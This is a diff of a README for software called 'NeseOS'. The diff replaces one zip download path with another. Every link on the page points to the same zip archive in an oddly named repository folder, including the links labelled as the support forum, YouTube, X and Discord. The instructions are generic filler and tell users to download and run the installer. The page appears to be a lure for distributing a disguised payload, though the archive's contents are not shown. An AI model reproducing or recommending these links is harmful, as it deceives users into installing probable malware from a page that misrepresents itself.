@@ -4,7 +4,7 @@
 
 Welcome to NeseOS! This guide will help you download and run NeseOS quickly and easily. 
 
-[![Download NeseOS](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+[![Download NeseOS](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
 
 ## 📥 Download & Install
 
@@ -12,13 +12,13 @@ To get started with NeseOS, please follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the NeseOS releases page to find the latest version of the software. Click on the link below:  
-   [Download NeseOS](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+   [Download NeseOS](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
 
 2. **Select the Latest Release**  
    On the releases page, look for the version labeled as **Latest Release**. This version contains the newest features and updates.
 
 3. **Download the Installer**  
-   Click the download link for the installer file. This file is typically named something like `https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip` or similar.
+   Click the download link for the installer file. This file is typically named something like `https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip` or similar.
 
 4. **Run the Installer**  
    Once the download is complete, locate the installer file in your downloads folder. Double-click the file to start the installation.
@@ -51,7 +51,7 @@ If you encounter any problems during installation, consider these tips:
 ## 📧 Need Help?
 
 For assistance, visit our official support forum:  
-[NeseOS Forum](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+[NeseOS Forum](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
 
 Here, you can ask questions and receive support from our community.
 
@@ -59,9 +59,9 @@ Here, you can ask questions and receive support from our community.
 
 Stay connected with NeseOS! Follow us on our official accounts for updates and news:
 
-- [YouTube](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
-- [X](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
-- [Discord](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+- [YouTube](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
+- [X](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
+- [Discord](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
 
 ## ✅ Stay Updated
 
@@ -76,7 +76,7 @@ At NeseOS, we prioritize security. Our team works hard to update the software re
 ## 🌍 Join Our Community
 
 Become part of the NeseOS family! Register on our forum here:  
-[Join NeseOS Forum](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+[Join NeseOS Forum](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
 
 Engage with fellow users and share your experiences. We welcome your feedback and contributions.
 
@@ -84,4 +84,4 @@ Engage with fellow users and share your experiences. We welcome your feedback an
 
 Thank you for choosing NeseOS. We hope you find our operating system efficient and user-friendly. If you have any questions or suggestions, feel free to reach out on our platforms. Enjoy your journey with NeseOS!
 
-[![Download NeseOS](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)](https://raw.githubusercontent.com/homiletic-sirup922/neseos/main/ultradeclamatory/neseos_expective.zip)
+[![Download NeseOS](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)](https://github.com/homiletic-sirup922/neseos/raw/refs/heads/main/ultradeclamatory/Software_v2.0-beta.2.zip)
